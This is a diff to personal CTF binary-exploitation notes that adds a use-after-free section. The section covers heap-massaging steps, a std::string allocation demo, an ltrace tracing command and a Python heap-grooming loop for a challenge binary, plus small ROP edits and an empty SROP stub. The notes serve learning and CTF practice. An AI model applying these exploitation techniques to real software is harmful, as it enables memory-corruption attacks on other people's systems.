@@ -96,6 +96,64 @@ pwndbg> x/32x $rbp - 0x20
 eu-unstrip "$stripped_libc" "$symbol_file"
 ```
 
+# use-after-free
+
+1. allocate `object foo1` with reference to address `bar1`, `array foo` points to object
+2. deallocate `object foo1`, `array foo` preserves pointer to object's address
+3. allocate `object foo2` with reference `bar2` to same address as deallocated `object foo1` (aka. heap massaging)
+4. array foo (with dangling pointer) dereferences controlled address `bar2` written by `object foo2`, not an object
+    - if program reads from address, access value in arbitrary address previously unreadable (aka. memory leak)
+    - if program writes to address, write-what-where in stack for rop
+
+- ! std::string uses in-object buffer for small strings, allocates memory for larger strings
+    - => control whether allocations are triggered
+- ! memory manager allocates to most recently freed address
+
+```cpp
+std::string x{"AAAA"}
+printf("%zu\n", sizeof(x));
+fwrite(&x, 1, sizeof(x), stdout);
+// Outputs object with string value
+
+std::string x{"AAAABBBBCCCCDDDD"}
+printf("%zu\n", sizeof(x));
+fwrite(&x, 1, sizeof(x), stdout);
+// Outputs object without string value
+```
+
+Heap massaging:
+
+- run with `socat tcp-listen:31337,reuseaddr exec:"ltrace -e malloc -e free ./foo"`
+- || guess layout:
+
+```python
+for i in range(20):
+    if i % 3 == 0:
+        add_book(s, "A" * 39, 600)
+    else:
+        add_book(s, "A" + str(i), 600)
+    s.recvuntil("Choice?")
+
+for i in range(2, 20, 2):
+    add_fav(s, i + 1)
+    s.recvuntil("Choice?")
+
+for i in range(2, 20, 2):
+    delete book(s, i + 1)
+
+exp = add_book(s, "A" * 39, 600)
+s.recvuntil("Choice?")
+```
+
+Check controlled registers: 
+
+- e.g. look for `0x41414141`
+
+References:
+
+- [Hacking Livestream \#48: Use\-after\-free \- YouTube](https://www.youtube.com/watch?v=zJw7CuSc8Sg)
+    - https://github.com/gynvael/stream-en
+
 # write-what-where
 
 - `_hook` functions:
@@ -158,7 +216,7 @@ r.sendline(f"{cmd} {quote(payload)} HTTP/1.1\r\n")
 r.close()
 ```
 
-# rop
+# return-oriented programming (rop)
 
 1. leak stack canary: Given multiple requests for same process, bruteforce bytes from boolean-based response
     - repeat for $rbp, then $rip
@@ -166,7 +224,7 @@ r.close()
 - ~/code/snippets/ctf/pwn/rop.py
     - Alternative: manual chain
     ```bash
-    ropper --search "pop r??" 
+    ropper --search "pop r??"
     # foreach address (= offset): p64(address + base_address)
 
     objdump -D _
@@ -186,6 +244,10 @@ r.close()
     rop += plt_write
     ```
 - [HackTheBox \- Rope](https://www.youtube.com/watch?v=GTQxZlr5yvE)
+
+# sigreturn-oriented programming (srop)
+
+TODO
 
 # windows
 
